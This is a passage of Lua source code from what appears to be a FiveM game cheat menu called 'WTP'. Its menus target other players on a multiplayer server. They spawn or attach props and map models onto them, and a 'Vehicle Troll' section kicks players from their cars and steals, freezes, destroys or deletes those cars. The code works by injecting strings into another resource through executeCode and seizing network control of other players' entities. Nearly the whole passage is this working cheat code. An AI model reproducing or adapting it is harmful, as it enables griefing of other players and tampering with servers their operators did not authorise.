                                    self:Notify("error", "WTP", "You must select at least one player!", 3000)
                                    return
                                end

                                function WTP:GetSelectedObjectModel()
                                    return value
                                end

                                WTP:SpawnSelectedObject(targetPlayers)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Misc",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_beer_bottle", "prop_soda_cup", "prop_papercup_01", "prop_cup_coffee_01",
                                "prop_champ_flute", "prop_cs_burger_01", "prop_cs_burger_02", "prop_cs_hotdog_01",
                                "prop_cs_pizza_01", "prop_cs_sandwich_01", "prop_cs_juice_01"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select at least one player!", 3000)
                                    return
                                end

                                function WTP:GetSelectedObjectModel()
                                    return value
                                end

                                WTP:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "WTP", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Object",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "p_ferris_wheel_amo_l", "p_ferris_wheel_amo_l2", "p_ferris_wheel_amo_p", "prop_gas_tank_02a"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select at least one player!", 3000)
                                    return
                                end

                                function WTP:GetSelectedObjectModel()
                                    return value
                                end

                                WTP:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "WTP", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Location",
                            scrollType = "onEnter",
                            value = 1,
                            values = {"City", "Docks", "Playa Vista", "Mountain", "Pink Cage", "Vespucci", "Mega Mall"},
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select at least one player!", 3000)
                                    return
                                end
                                local mapValues = {
                                    ["City"] = "dt1_lod_slod3",
                                    ["Docks"] = "id2_lod_slod4",
                                    ["Playa Vista"] = "kt1_lod_slod4",
                                    ["Mountain"] = "ch2_lod_slod3",
                                    ["Pink Cage"] = "hw1_lod_slod4",
                                    ["Vespucci"] = "kt1_lod_slod4",
                                    ["Mega Mall"] = "sc1_lod_slod4"
                                }
                                local mapHash = mapValues[value]
                                function WTP:GetSelectedObjectModel()
                                    return mapHash
                                end

                                WTP:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "WTP", "Attach Location for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Spawn Object",
                            scrollType = "onEnter",
                            value = 1,
                            values = {"p_ferris_wheel_amo_l", "p_ferris_wheel_amo_l2", "p_ferris_wheel_amo_p", "prop_gas_tank_02a", "xs_propint2_building_base_01", "ar_prop_ar_neon_gate8x_02a", "sr_prop_stunt_tube_xs_02a", "xs_terrain_set_dyst_01_grnd", "xs_prop_arena_goal", "xs_propint3_waste_01_statues"},
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select at least one player!", 3000)
                                    return
                                end

                                function WTP:GetSelectedObjectModel()
                                    return value
                                end

                                WTP:SpawnSelectedObjects(targetPlayers)

                                self:Notify("success", "WTP", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Spawn Location",
                            scrollType = "onEnter",
                            value = 1,
                            values = {"City", "Docks", "Playa Vista", "Mountain", "Pink Cage", "Vespucci", "Mega Mall"},
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select at least one player!", 3000)
                                    return
                                end
                                local mapValues = {
                                    ["City"] = "dt1_lod_slod3",
                                    ["Docks"] = "id2_lod_slod4",
                                    ["Playa Vista"] = "kt1_lod_slod4",
                                    ["Mountain"] = "ch2_lod_slod3",
                                    ["Pink Cage"] = "hw1_lod_slod4",
                                    ["Vespucci"] = "kt1_lod_slod4",
                                    ["Mega Mall"] = "sc1_lod_slod4"
                                }
                                local mapHash = mapValues[value]
                                function WTP:GetSelectedObjectModel()
                                    return mapHash
                                end

                                WTP:SpawnSelectedObjects(targetPlayers)

                                self:Notify("success", "WTP", "Attach Location for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                    }
                },
                {
                    label = "Vehicle",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Kick From Vehicle", "Bring Vehicle", "Freeze Vehicle", "Destroy Vehicle", "Delete Vehicle", "Steal Vehicle", "Remove Vehicle Tires", "Launch Vehicle"}, label = "Vehicle Troll",
                            onSelect = function(value)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 then
                                        self:Notify("error", "WTP", "There was an error while trying to kick the player from their vehicle! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        WTP:UpdateListMenu()
                                        return
                                    end

                                    if not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(player))) then
                                        self:Notify("error", "WTP", "There was an error while trying to kick the player from their vehicle! (ERR:2)", 3000)
                                        return
                                    end

                                    if value == "Kick From Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTP.SafeRunNative(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, driver, true, true)
                                                                WTP.SafeRunNative(SpecialFunctionDoNotUse, driver, true)
                                                                WTP.SafeRunNative(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTP.SafeRunNative(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTP.SafeRunNative(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTP.SafeRunNative(DeleteEntity, currentDriver)
                                                                end

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTP.SafeRunNative(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTP.SafeRunNative(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Bring Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCoords(entity, coords)
                                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, entity, coords.x, coords.y, coords.z, true, true, false)
                                                        end
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTP.SafeRunNative(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, driver, true, true)
                                                                WTP.SafeRunNative(SpecialFunctionDoNotUse, driver, true)
                                                                WTP.SafeRunNative(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTP.SafeRunNative(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTP.SafeRunNative(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTP.SafeRunNative(DeleteEntity, currentDriver)
                                                                end

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTP.SafeRunNative(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTP.SafeRunNative(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        SetCoords(vehicle, GetEntityCoords(PlayerPedId()))
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Freeze Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTP.SafeRunNative(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, driver, true, true)
                                                                WTP.SafeRunNative(SpecialFunctionDoNotUse, driver, true)
                                                                WTP.SafeRunNative(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTP.SafeRunNative(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTP.SafeRunNative(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTP.SafeRunNative(DeleteEntity, currentDriver)
                                                                end

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTP.SafeRunNative(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTP.SafeRunNative(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        WTP.SafeRunNative(FreezeEntityPosition, vehicle, true)
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Destroy Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTP.SafeRunNative(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, driver, true, true)
                                                                WTP.SafeRunNative(SpecialFunctionDoNotUse, driver, true)
                                                                WTP.SafeRunNative(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTP.SafeRunNative(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTP.SafeRunNative(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTP.SafeRunNative(DeleteEntity, currentDriver)
                                                                end

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTP.SafeRunNative(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTP.SafeRunNative(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        WTP.SafeRunNative(SetVehicleEngineHealth, vehicle, -4000)
                                                        WTP.SafeRunNative(SetVehicleBodyHealth, vehicle, -4000)
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Delete Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTP.SafeRunNative(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, driver, true, true)
                                                                WTP.SafeRunNative(SpecialFunctionDoNotUse, driver, true)
                                                                WTP.SafeRunNative(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTP.SafeRunNative(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTP.SafeRunNative(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTP.SafeRunNative(DeleteEntity, currentDriver)
                                                                end

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTP.SafeRunNative(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTP.SafeRunNative(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        WTP.SafeRunNative(DeleteEntity, vehicle)
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Steal Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTP.SafeRunNative(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, driver, true, true)
                                                                WTP.SafeRunNative(SpecialFunctionDoNotUse, driver, true)
                                                                WTP.SafeRunNative(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTP.SafeRunNative(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTP.SafeRunNative(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTP.SafeRunNative(DeleteEntity, currentDriver)
                                                                end

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTP.SafeRunNative(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTP.SafeRunNative(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        WTP.SafeRunNative(TaskWarpPedIntoVehicle, PlayerPedId(), vehicle, -1)
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Remove Vehicle Tires" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTP.SafeRunNative(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
